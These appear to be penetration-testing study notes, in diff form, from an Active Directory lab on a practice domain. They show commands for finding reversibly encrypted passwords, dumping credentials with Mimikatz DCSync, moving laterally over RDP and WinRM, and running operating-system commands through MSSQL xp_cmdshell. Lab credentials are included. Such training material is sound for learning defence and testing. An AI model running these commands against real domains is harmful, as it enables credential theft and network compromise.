+	> When this option is set on a user account, it does not mean that the passwords are stored in cleartext. Instead, they are stored using RC4 encryption. The trick here is that the key needed to decrypt them is stored in the registry (the Syskey => https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview) and can be extracted by a Domain Admin or equivalent. Tools such as secretsdump.py will decrypt any passwords stored using reversible encryption while dumping the NTDS file either as a Domain Admin or using an attack such as DCSync. If this setting is disabled on an account, a user will need to change their password for it to be stored using one-way encryption. Any passwords set on accounts with this setting enabled will be stored using reversible encryption until they are changed. We can enumerate this using the Get-ADUser cmdlet:
+	> Enumerating Further using Get-ADUser
+		PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+
+			DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+			Enabled            : True
+			GivenName          :
+			Name               : PROXYAGENT
+			ObjectClass        : user
+			ObjectGUID         : c72d37d9-e9ff-4e54-9afa-77775eaaf334
+			SamAccountName     : proxyagent
+			SID                : S-1-5-21-3842939050-3880317879-2865463114-5222
+			Surname            :
+			userAccountControl : 640
+			UserPrincipalName  :
+
+	> We can see that one account, proxyagent, has the reversible encryption option set with PowerView as well:
+	> Checking for Reversible Encryption Option using Get-DomainUser
+		PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+
+		samaccountname                         useraccountcontrol
+		--------------                         ------------------
+		proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
+		syncron        ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
+
+	> We will notice the tool decrypted the password and provided us with the cleartext value.
+	> Displaying the Decrypted Password
+		m1l0js@htb[/htb]$ cat inlanefreight_hashes.ntds.cleartext 
+		proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
+
+	> I have been on a few engagements where all user accounts were stored using reversible encryption. Some clients may do this to be able to dump NTDS and perform periodic password strength audits without having to resort to offline password cracking.
+
+	> We can perform the attack with Mimikatz as well. Using Mimikatz, we must target a specific user. Here we will target the built-in administrator account. We could also target the krbtgt account and use this to create a Golden Ticket for persistence, but that is outside the scope of this module.
+	> Performing the Attack with Mimikatz
+		PS C:\htb> .\mimikatz.exe
+		mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+
+* In the next section, we'll see some ways to enumerate and take advantage of remote access rights that may be granted to a user we control. These methods include Remote Desktop Protocol (RDP), WinRM (or PsRemoting), and SQL Server admin access.
+
+-=-=-=-=-=-=
+[+] Privileged Access 
+
+	> Once we gain a foothold in the domain, our goal shifts to advancing our position further by moving laterally or vertically to obtain access to other hosts, and eventually achieve domain compromise or some other goal, depending on the aim of the assessment. To achieve this, there are several ways we can move laterally. Typically, if we take over an account with local admin rights over a host, or set of hosts, we can perform a Pass-the-Hash attack to authenticate via the SMB protocol.
+	> But what if we don't yet have local admin rights on any hosts in the domain?
+	> There are several other ways we can move around a Windows domain:
+	     	- Remote Desktop Protocol (RDP) - is a remote access/management protocol that gives us GUI access to a target host
+	     	- PowerShell Remoting - also referred to as PSRemoting or Windows Remote Management (WinRM) access, is a remote access protocol that allows us to run commands or enter an interactive command-line session on a remote host using PowerShell
+	     	- MSSQL Server - an account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute queries against the database. This access can be used to run operating system commands in the context of the SQL Server service account through various methods
+	> We can enumerate this access in various ways. The easiest, once again, is via BloodHound, as the following edges exist to show us what types of remote access privileges a given user has:
+		- CanRDP
+	     	- CanPSRemote
+	     	- SQLAdmin
+	> We can also enumerate these privileges using tools such as PowerView and even built-in tools.
+
+* Scenario Setup
+	> In this section, we will move back and forth between a Windows and Linux attack host as we work through the various examples. You can spawn the hosts for this section at the end of this section and RDP into the MS01 Windows attack host. For the portion of this section that requires interaction from a Linux host (mssqlclient.py and evil-winrm) you can open a PowerShell console on MS01 and SSH to 172.16.5.225 with the credentials htb-student:HTB_@cademy_stdnt!. We recommend that you try all methods shown in this section (i.e., Enter-PSSession and PowerUpSQL from the Windows attack host and evil-winrm and mssqlclient.py from the Linux attack host).
+
+* Remote Desktop
+
+	> Typically, if we have control of a local admin user on a given machine, we will be able to access it via RDP. Sometimes, we will obtain a foothold with a user that does not have local admin rights anywhere, but does have the rights to RDP into one or more machines. This access could be extremely useful to us as we could use the host position to:
+	     	- Launch further attacks
+	     	- We may be able to escalate privileges and obtain credentials for a higher privileged user
+	> Using PowerView, we could use the Get-NetLocalGroupMember function to begin enumerating members of the Remote Desktop Users group on a given host. Let's check out the Remote Desktop Users group on the MS01 host in our target domain.
+	> Enumerating the Remote Desktop Users Group
+		PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
+	 	ComputerName : ACADEMY-EA-MS01
+	 	GroupName    : Remote Desktop Users
+	 	MemberName   : INLANEFREIGHT\Domain Users
+	 	SID          : S-1-5-21-3842939050-3880317879-2865463114-513
+	 	IsGroup      : True
+	 	IsDomain     : UNKNOWN
+	> From the information above, we can see that all Domain Users (meaning all users in the domain) can RDP to this host. It is common to see this on Remote Desktop Services (RDS) hosts or hosts used as jump hosts. This type of server could be heavily used, and we could potentially find sensitive data (such as credentials) that could be used to further our access, or we may find a local privilege escalation vector that could lead to local admin access and credential theft/account takeover for a user with more privileges in the domain. Typically the first thing I check after importing BloodHound data is:
+	> Does the Domain Users group have local admin rights or execution rights (such as RDP or WinRM) over one or more hosts?
+	> Checking the Domain Users Group's Local Admin & Execution Rights using BloodHound
+		(https://academy.hackthebox.com/storage/modules/143/bh_RDP_domain_users.png)
+	> If we gain control over a user through an attack such as LLMNR/NBT-NS Response Spoofing or Kerberoasting, we can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under Execution Rights on the Node Info tab.
+	> We could also check the Analysis tab and run the pre-built queries Find Workstations where Domain Users can RDP or Find Servers where Domain Users can RDP. There are other ways to enumerate this information, but BloodHound is a powerful tool that can help us narrow down these types of access rights quickly and accurately, which is hugely beneficial to us as penetration testers under time constraints for the assessment period. This can also be helpful for the blue team to periodically audit remote access rights across the environment and catch large-scale issues such as all Domain Users having unintended access to a host or audit rights for specific users/groups.
+	> To test this access, we can either use a tool such as xfreerdp or Remmina from our VM or the Pwnbox or mstsc.exe if attacking from a Windows host.
+
+* WinRM
+
+	> Like RDP, we may find that either a specific user or an entire group has WinRM access to one or more hosts. This could also be low-privileged access that we could use to hunt for sensitive data or attempt to escalate privileges or may result in local admin access, which could potentially be leveraged to further our access. We can again use the PowerView function Get-NetLocalGroupMember to the Remote Management Users group. This group has existed since the days of Windows 8/Windows Server 2012 to enable WinRM access without granting local admin rights.
+	> Enumerating the Remote Management Users Group
+		PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
+		
+		ComputerName : ACADEMY-EA-MS01
+		GroupName    : Remote Management Users
+		MemberName   : INLANEFREIGHT\forend
+		SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
+		IsGroup      : False
+		IsDomain     : UNKNOWN
+
+	> We can also utilize this custom Cypher query in BloodHound to hunt for users with this type of access. This can be done by pasting the query into the Raw Query box at the bottom of the screen and hitting enter.
+		MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
+
+	> We could also add this as a custom query to our BloodHound installation, so it's always available to us.
+	> We can use the Enter-PSSession cmdlet using PowerShell from a Windows host.
+	> Establishing WinRM Session from Windows
+
+		PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
+		PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
+		PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
+
+			[ACADEMY-EA-DB01]: PS C:\Users\forend\Documents> hostname
+			ACADEMY-EA-DB01
+			[ACADEMY-EA-DB01]: PS C:\Users\forend\Documents> Exit-PSSession
+			PS C:\htb> 
+
+	> From our Linux attack host, we can use the tool evil-winrm to connect.
+	> To use evil-winrm we can install it using the following command:
+	> Installing Evil-WinRM
+		m1l0js@htb[/htb]$ gem install evil-winrm
+
+	> We can connect with just an IP address and valid credentials.
+	> Connecting to a Target with Evil-WinRM and Valid Credentials
+		m1l0js@htb[/htb]$ evil-winrm -i 10.129.201.234 -u forend
+
+* SQL Server Admin
+
+	> More often than not, we will encounter SQL servers in the environments we face. It is common to find user and service accounts set up with sysadmin privileges on a given SQL server instance. We may obtain credentials for an account with this access via Kerberoasting (common) or others such as LLMNR/NBT-NS Response Spoofing or password spraying. Another way that you may find SQL server credentials is using the tool Snaffler(https://github.com/SnaffCon/Snaffler) to find web.config or other types of configuration files that contain SQL server connection strings.
+	> BloodHound, once again, is a great bet for finding this type of access via the SQLAdmin edge. We can check for SQL Admin Rights in the Node Info tab for a given user or use this custom Cypher query to search:
+		MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
+
+	> Here we see one user, damundsen has SQLAdmin rights over the host ACADEMY-EB-DB01.
+	> Using a Custom Cypher Query to Check for SQL Admin Rights in BloodHound
+		(https://academy.hackthebox.com/storage/modules/143/sqladmins_bh.png)
+
+
+	> We can use our ACL rights to authenticate with the wley user, change the password for the damundsen user and then authenticate with the target using a tool such as PowerUpSQL, which has a handy command cheat sheet(https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet). Let's assume we changed the account password to SQL1234! using our ACL rights. We can now authenticate and run operating system commands.
+	> First, let's hunt for SQL server instances.
+	> Enumerating MSSQL Instances with PowerUpSQL
+		PS C:\htb> cd .\PowerUpSQL\
+		PS C:\htb>  Import-Module .\PowerUpSQL.ps1
+		PS C:\htb>  Get-SQLInstanceDomain
+
+	> We could then authenticate against the remote SQL server host and run custom queries or operating system commands. It is worth experimenting with this tool, but extensive enumeration and attack tactics against MSSQL are outside this module's scope.
+	> Enumerating MSSQL Instances with PowerUpSQL
+		PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
+
+	> We can also authenticate from our Linux attack host using mssqlclient.py from the Impacket toolkit.
+	> Running mssqlclient.py Against the Target
+		m1l0js@htb[/htb]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+	> Once connected, we could type help to see what commands are available to us.
+	> Viewing our Options with Access to the SQL Server
+
+		SQL> help
+		     lcd {path}                 - changes the current local directory to {path}
+		     exit                       - terminates the server process (and this session)
+		     enable_xp_cmdshell         - you know what it means
+		     disable_xp_cmdshell        - you know what it means
+		     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
+		     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
+		     ! {cmd}                    - executes a local shell cmd
+
+	> We could then choose enable_xp_cmdshell to enable the xp_cmdshell stored procedure(https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allows for one to execute operating system commands via the database if the account in question has the proper access rights.
+	> Choosing enable_xp_cmdshell
+		SQL> enable_xp_cmdshell
+
+	> Finally, we can run commands in the format xp_cmdshell <command>. Here we can enumerate the rights that our user has on the system and see that we have SeImpersonatePrivilege(https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege), which can be leveraged in combination with a tool such as JuicyPotato(https://github.com/ohpe/juicy-potato), PrintSpoofer(https://github.com/itm4n/PrintSpoofer), or RoguePotato(https://github.com/antonioCoco/RoguePotato) to escalate to SYSTEM level privileges, depending on the target host, and use this access to continue toward our goal. 
+	> Enumerating our Rights on the System using xp_cmdshell
+
+
+* Moving On
+
+	> This section demonstrated a few possible lateral movement techniques in an Active Directory environment. We should always look for these types of rights when we gain our initial foothold and gain control of additional user accounts. Remember that enumerating and attacking is an iterative process! Every time we gain control over another user/host, we should repeat some enumeration steps to see what, if any, new rights and privileges we have obtained. Never overlook remote access rights if the user is not a local admin on the target host because we could very likely get onto a host where we find sensitive data, or we're able to escalate privileges.
+	> Finally, whenever we find SQL credentials (in a script, a web.config file, or another type of database connection string), we should test access against any MSSQL servers in the environment. This type of access is almost guaranteed SYSTEM access over a host. If we can run commands as the account we authenticate with, it will almost always have the dangerous SeImpersonatePrivilege right.
+	> The following section will address a common issue we often run into when using WinRM to connect to hosts in the network.
 
 
 
